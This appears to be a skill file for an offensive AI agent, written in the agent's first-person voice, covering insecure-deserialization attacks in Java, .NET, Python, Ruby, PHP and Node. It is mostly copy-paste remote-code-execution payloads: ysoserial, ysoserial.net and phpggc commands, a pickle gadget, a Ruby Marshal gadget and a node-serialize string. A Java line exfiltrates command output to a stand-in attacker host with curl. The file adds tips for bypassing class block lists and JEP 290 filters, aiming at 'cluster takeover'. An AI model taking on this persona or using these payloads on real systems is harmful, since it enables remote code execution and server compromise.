# SKILL: Insecure Deserialization (Java / .NET / Python / Ruby / PHP / Node)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (insecure deserialization (java / .net / python / ruby / php / node)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Deserializing attacker-controlled bytes against a class graph triggers gadget chains that lead to RCE. I generate gadgets via ysoserial / marshalsec / ysoserial.net / phpggc.

---

## DETECTION
Look for serialized blobs (Base64 starts with `rO0` Java, `AAEAAA` .NET, `pickle` headers, `O:` PHP, ``;` Ruby Marshal, ``msgpack`` etc.).

## EXPLOITATION
### Java
```bash
# Find gadget — Apache Commons-Collections, Jackson, XStream, Hessian
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0
# inject into cookie / param / RMI / JMX
```

### .NET
```bash
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e ..."
# Or for ObjectStateFormatter / LosFormatter / DataContractSerializer
```

### Python pickle
```python
import pickle, base64
class E:
  def __reduce__(self): return (__import__('os').system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

### Ruby Marshal
```ruby
require 'erb'; require 'base64'
class Gadget
  def init; ERB.new("<% `id` %>").result; end
  def marshal_dump; init; '' ; end
end
puts Base64.encode64(Marshal.dump(Gadget.new))
```

### PHP unserialize
Use `phpggc` for many gadgets:
```bash
phpggc Symfony/RCE4 system id -b
```

### Node.js — node-serialize / serialize-javascript
```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(e,o){console.log(o)});}()"}
```

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Block list of class names → chain via reflective gadgets / proxy gadgets.

## CHAIN POTENTIAL
Deserialization → RCE → cluster takeover.

## TOOLS
ysoserial, ysoserial.net, marshalsec, phpggc, frohoff/JNDIExploit

## COMMANDS
(see above)

## EDGE CASES / NOT-A-BUG TRAPS
Modern Java with `JEP 290` filter requires explicit allow-list — bypass via classes already on filter.

## TRIAGE ANGLE (per platform)
Show full RCE PoC.

## SEVERITY & CVSS
9.8.

## REFERENCES
frohoff/ysoserial • pwntester/ysoserial.net • snoopysecurity/awesome-deserialization
